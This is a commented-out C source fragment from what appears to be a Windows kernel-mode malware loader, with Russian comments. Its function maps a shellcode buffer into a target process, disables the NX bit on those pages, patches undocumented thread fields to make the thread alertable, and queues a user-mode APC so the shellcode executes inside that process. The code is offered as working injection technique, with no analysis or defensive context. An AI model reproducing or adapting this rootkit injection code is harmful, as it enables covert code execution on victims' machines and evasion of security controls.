// 
// void KernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, IN OUT void* *NormalContext,    IN OUT void* *SystemArgument1, IN OUT void* *SystemArgument2)
// {
//     DEFINE_GLOBAL_DATA(pGlobalData);
//     IMPL_GLOBAL_DATA(pGlobalData);
// 
//     *NormalContext = pGlobalData->pMappedSCB;
// }
// 
// /* puts the APC to the user mode thread */
// ///!!!///
// BOOLEAN InstallUserModeApc(PETHREAD eThread, PEPROCESS eProcess, char* appPath/*, UINT32 cmdID*/)
// {
// #define SHELL_SIZE 396//164
//     KAPC kApc;
//     KAPC_STATE apcState;
//     PMDL pMDL, pMDL_SCB;
//     void* pMappedRoutine = NULL;
//     HANDLE hEvent = NULL;
//     NTSTATUS ntStatus;
//     LARGE_INTEGER delay;
//     BOOLEAN result = FALSE;
//     char* shellAppPath;
//     SIZE_T nameLen;
//     PSHELLCODE_BLOCK pShellBlock;
//     PUCHAR pShellcode;
//     DEFINE_GLOBAL_DATA(pGlobalData);
//     IMPL_GLOBAL_DATA(pGlobalData);
// 
//     pGlobalData->fnUtilsAllocateMemory(&pShellBlock, sizeof(SHELLCODE_BLOCK), NonPagedPool);
//     pGlobalData->fnUtilsAllocateMemory(&pShellcode, SHELL_SIZE, NonPagedPool);
//     pGlobalData->fnmemset(pShellBlock, 0, sizeof(SHELLCODE_BLOCK));
//     pGlobalData->fnmemcpy(pShellcode, pGlobalData->pShellcode, SHELL_SIZE);
// 
// //     ntStatus = pGlobalData->fnFnRtlStringCchLengthA(appPath, 63, &nameLen);
// // 
// //     if (ntStatus != STATUS_SUCCESS || nameLen < 4)
// //         return FALSE;
// // 
// //     shellAppPath = pShellcode + SHELL_SIZE/*sizeof(bin_data1)*/ - 64;
// // 
// //     pGlobalData->fnmemset(shellAppPath, 0, 64);
// //     *(UINT32*)shellAppPath = 0x005C3A43; /* c:\ */
// //     ntStatus = pGlobalData->fnFnRtlStringCchCatA(shellAppPath, 63 - 3, appPath);
// // 
// //     if (ntStatus != STATUS_SUCCESS)
// //         return FALSE;
// 
//      pMDL = pGlobalData->fnIoAllocateMdl((void**)&pShellcode, SHELL_SIZE/*sizeof(bin_data1)*/, FALSE, FALSE, NULL);
// 
//     if (pMDL == NULL) {
//         pGlobalData->fnExFreePoolWithTag(pShellcode, LOADER_TAG);
//         pGlobalData->fnExFreePoolWithTag(pShellBlock, LOADER_TAG);
//         return FALSE;
//     }
// 
//      pMDL_SCB = pGlobalData->fnIoAllocateMdl(pShellBlock, sizeof(SHELLCODE_BLOCK), FALSE, FALSE, NULL);
//     
//     if (pMDL_SCB == NULL) {
//         pGlobalData->fnIoFreeMdl(pMDL);
//         pGlobalData->fnExFreePoolWithTag(pShellcode, LOADER_TAG);
//         pGlobalData->fnExFreePoolWithTag(pShellBlock, LOADER_TAG);
//         return FALSE;
//     }
//     
// //    __try {
//         pGlobalData->fnMmProbeAndLockPages(pMDL, KernelMode, IoWriteAccess);
//         pGlobalData->fnMmProbeAndLockPages(pMDL_SCB, KernelMode, IoWriteAccess);
// //      }
// //      __except(EXCEPTION_EXECUTE_HANDLER) {
// //          pGlobalData->fnIoFreeMdl(pMDL);
// //          pGlobalData->fnIoFreeMdl(pMDL_SCB);
// //          return FALSE;
// //      }
//  
//     // Подключаем текущий поток к указанному процессу
//     pGlobalData->fnKeStackAttachProcess(eProcess, &apcState);    
// 
// //     pShellBlock->pCreateProcessA = pGlobalData->fnUtilsGetApiFuncVA(CREATEPROCESSA_HASH);
// //     if (pShellBlock->pCreateProcessA == NULL)
// //         goto End;
// // 
// //     pShellBlock->pSetEvent = pGlobalData->fnUtilsGetApiFuncVA(SETEVENT_HASH);
// //     if (pShellBlock->pSetEvent == NULL)
// //         goto End;
// 
// //    __try {
//         pMappedRoutine = pGlobalData->fnMmMapLockedPagesSpecifyCache(pMDL, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
// 
//         if (pMappedRoutine != NULL) {
//             pGlobalData->pMappedSCB = pGlobalData->fnMmMapLockedPagesSpecifyCache(pMDL_SCB, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
// 
//             if (pGlobalData->pMappedSCB == NULL) {
//                 pGlobalData->fnMmUnmapLockedPages(pMappedRoutine, pMDL);
//             }
//         }
// //      }
// //      __except(EXCEPTION_EXECUTE_HANDLER) {
// //          result = FALSE;
// //      }
// 
//     if (/*!result || */pMappedRoutine == NULL || pGlobalData->pMappedSCB == NULL) {
//         goto End;
//     }

// 
//     if (!pGlobalData->fnUtilsDisablePageNXBit(pMappedRoutine, SHELL_SIZE)) {
//         goto End;
//     }
// 
//      FnKdPrint(("pMDL : 0x%p, &NormalRoutine : 0x%x, MappedAddress: 0x%x and 0x%x\n", pMDL, (void*)&pShellcode, pMappedRoutine, pGlobalData->pMappedSCB));
// 
//     ntStatus = pGlobalData->fnZwCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
//     if (!NT_SUCCESS(ntStatus))     {
//         FnKdPrint(("Error with ZwCreateEvent : 0x%x\n", ntStatus));
//         goto End;
//     }
// 
//      pShellBlock->hEvent = hEvent;
// 
//     delay.QuadPart = -20000000I64; // 2 секунды
//     pGlobalData->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
//     
//     pGlobalData->fnKeInitializeApc(&kApc, (PKTHREAD)eThread, OriginalApcEnvironment, pGlobalData->fnKernelRoutine, NULL, (PKNORMAL_ROUTINE)pMappedRoutine, UserMode, NULL);
// 
//     if (!LDRINFO_IS_XP_LIKE_OS) {
//         *((PUCHAR)eThread + pGlobalData->sysSpec.dwAlertable) |= 0x20;
//         *((PUCHAR)eThread + pGlobalData->sysSpec.dwApcQueueable) |= 0x20;
//     }
//     else {
//         *((PUCHAR)eThread + pGlobalData->sysSpec.dwApcQueueable) = 1;
//     }
//     
//     ((KAPC_STATE*)((PUCHAR)eThread + pGlobalData->sysSpec.dwApcState))->UserApcPending = 1;
// 
//     if(!pGlobalData->fnKeInsertQueueApc(&kApc, NULL/*pGlobalData->pMappedSCB*/, NULL, 0)) {
//         goto End1;
//     }
// 
//     delay.QuadPart = -110000000I64; // 11 секунд
//     FnKdPrint(("Waiting for execution..."));
//     ntStatus = pGlobalData->fnZwWaitForSingleObject(hEvent, FALSE, &delay);
//     if (ntStatus == STATUS_ABANDONED_WAIT_0 || ntStatus == STATUS_TIMEOUT)     {
//         goto End;
//     }
// 
//     result = TRUE;
//     FnKdPrint(("Executed APC successfully.\n"));
// End:
//     if (pMappedRoutine != NULL)
//         pGlobalData->fnMmUnmapLockedPages(pMappedRoutine, pMDL);
//     if (pGlobalData->pMappedSCB != NULL)
//         pGlobalData->fnMmUnmapLockedPages(pGlobalData->pMappedSCB, pMDL_SCB);
//     if (pMDL->MdlFlags & MDL_PAGES_LOCKED)
//         pGlobalData->fnMmUnlockPages(pMDL);
//     if (pMDL_SCB->MdlFlags & MDL_PAGES_LOCKED)
//         pGlobalData->fnMmUnlockPages(pMDL_SCB);
//     pGlobalData->fnIoFreeMdl(pMDL);
//     pGlobalData->fnIoFreeMdl(pMDL_SCB);
//     pGlobalData->fnKeUnstackDetachProcess(&apcState);
// End1:
//     if (hEvent != NULL)
//         pGlobalData->fnZwClose(hEvent);
//     if (result)
//     pGlobalData->fnExFreePoolWithTag(pShellcode, LOADER_TAG);
//     pGlobalData->fnExFreePoolWithTag(pShellBlock, LOADER_TAG);
//     return result;
// }

